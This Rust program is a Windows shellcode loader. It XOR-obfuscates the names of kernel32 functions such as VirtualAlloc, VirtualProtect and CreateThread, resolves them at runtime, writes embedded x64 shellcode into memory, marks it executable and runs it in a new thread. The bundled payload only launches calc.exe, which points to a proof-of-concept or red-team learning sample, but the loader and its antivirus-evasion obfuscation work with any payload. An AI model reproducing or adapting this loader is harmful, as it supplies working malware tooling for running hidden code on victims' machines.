use std::ffi::CString;
use std::ptr;
use winapi::ctypes::c_void;
use winapi::shared::basetsd::SIZE_T;
use winapi::shared::minwindef::{LPVOID, DWORD, PWORD, BOOL, LPDWORD};
use winapi::um::libloaderapi::{GetModuleHandleA, GetProcAddress};   
use winapi::um::synchapi::WaitForSingleObject;
use winapi::um::handleapi::CloseHandle; 
use winapi::um::winbase::INFINITE;
use winapi::um::minwinbase::{LPSECURITY_ATTRIBUTES, LPTHREAD_START_ROUTINE};
use winapi::um::winnt::{MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE, HANDLE};

// helper function to XOR string
fn xor_string(input: &str, key: &str) -> String {
    let mut bytes = input.as_bytes().to_vec();  // Convert the input string to a byte vector
    let key_bytes = key.as_bytes();             // Convert the key string to a byte slice

    for (byte, &k) in bytes.iter_mut().zip(key_bytes.iter().cycle()) {
        *byte ^= k; // Perform XOR operation
    }

    // Convert the modified bytes back to a String
    String::from_utf8(bytes).expect("Failed to convert XORed bytes to string")
}

fn inject_local(shellcode: &[u8]) {
    unsafe {
        // Create a CString and bind it to a variable; to avoid having it deallocated
        let kernel32_dll = CString::new("Kernel32.dll").expect("CString creation failed");
        // Get a handle to Kernel32.dll
        let kernel32_handle = GetModuleHandleA(kernel32_dll.as_ptr());
        
        let key = "123123";

        // VirtualAlloc
        let str_virtual_alloc = "g[AEGR]s_]]P";
        let decrypted = xor_string(&str_virtual_alloc, key);
        let virtual_alloc_name = CString::new(decrypted).unwrap();
        let virtual_alloc_ptr = GetProcAddress(kernel32_handle, virtual_alloc_name.as_ptr());
        let fn_virtual_alloc: unsafe extern "system" fn(LPVOID, SIZE_T, DWORD, DWORD) -> LPVOID =
            std::mem::transmute(virtual_alloc_ptr);

        // VirtualProtect
        let str_virtual_protect = "g[AEGR]bA^FVRF";
        let decrypted = xor_string(&str_virtual_protect, key);
        let virtual_protect_name = CString::new(decrypted).unwrap();
        let virtual_protect_ptr = GetProcAddress(kernel32_handle, virtual_protect_name.as_ptr());
        let fn_virtual_protect: unsafe extern "system" fn(LPVOID, SIZE_T, DWORD, PWORD) -> BOOL =
                std::mem::transmute(virtual_protect_ptr);

        // CreateThread
        let str_create_thread = "r@VPFVeZATSW";
        let decrypted = xor_string(&str_create_thread, key);
        let create_thread_name = CString::new(decrypted).unwrap();
        let create_thread_ptr = GetProcAddress(kernel32_handle, create_thread_name.as_ptr());
        let fn_create_thread: unsafe extern "system" fn(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD) -> HANDLE =
                std::mem::transmute(create_thread_ptr);

        // VirtualFree
        let str_virtual_free = "g[AEGR]tATW";
        let decrypted = xor_string(&str_virtual_free, key);
        let virtual_free_name = CString::new(decrypted).unwrap();
        let virtual_free_ptr = GetProcAddress(kernel32_handle, virtual_free_name.as_ptr());
        let fn_virtual_free: unsafe extern "system" fn(LPVOID, SIZE_T, DWORD) -> BOOL =
                std::mem::transmute(virtual_free_ptr);

        let allocated_memory = fn_virtual_alloc(
            ptr::null_mut(),          // Address to start allocation from. Null means 'anywhere'
            shellcode.len(),          // Size of allocation
            MEM_COMMIT | MEM_RESERVE, // Allocate memory immediately
            PAGE_READWRITE,           // Memory protection flags
        );
        //println!("Mem has been allocated!");

        if allocated_memory.is_null() {
            panic!("Failed to allocate memory.");
        }

        std::ptr::copy(
            shellcode.as_ptr(),
            // Here we 'cast' the type of our pointer from "*mut c_void" to "*mut u8", as required by the copy function
            allocated_memory as *mut u8,
            shellcode.len(),
        );

        // Change the memory protection to RX (read-execute)
        let mut old_protect = 0;

        let mem_protect = fn_virtual_protect(
            allocated_memory,
            shellcode.len(),
            PAGE_EXECUTE_READ,
            &mut old_protect,
        );

        if mem_protect == 0 {
            panic!("Failed to change memory protection.");
        }

        let allocated_memory_pointer: extern "system" fn(*mut c_void) -> u32 =
            { std::mem::transmute(allocated_memory) };
        let thread_handle = fn_create_thread(
            ptr::null_mut(),
            0,
            Some(allocated_memory_pointer),
            ptr::null_mut(),
            0,
            ptr::null_mut(),
        );

        WaitForSingleObject(thread_handle, INFINITE);

        // Normally Rust is quite good at memory management, but since we are doing unsafe WinAPI stuff we have to clean up after ourselves
        // In this case, we free the memory we allocated earlier and close the thread handle
        fn_virtual_free(allocated_memory, 0, MEM_RELEASE);
        CloseHandle(thread_handle);
    }
}

fn main() {
    let shellcode: &[u8] = &[
        // slice reference to a sequence of bytes
        0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52,
        0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,
        0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9,
        0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
        0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48,
        0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01,
        0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48,
        0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
        0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c,
        0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0,
        0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04,
        0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
        0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48,
        0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f,
        0x87, 0xff, 0xd5, 0xbb, 0xe0, 0x1d, 0x2a, 0x0a, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
        0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb,
        0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x43, 0x3a, 0x5c,
        0x77, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73, 0x5c, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x33,
        0x32, 0x5c, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00,
    ];
    
    inject_local(&shellcode);
}
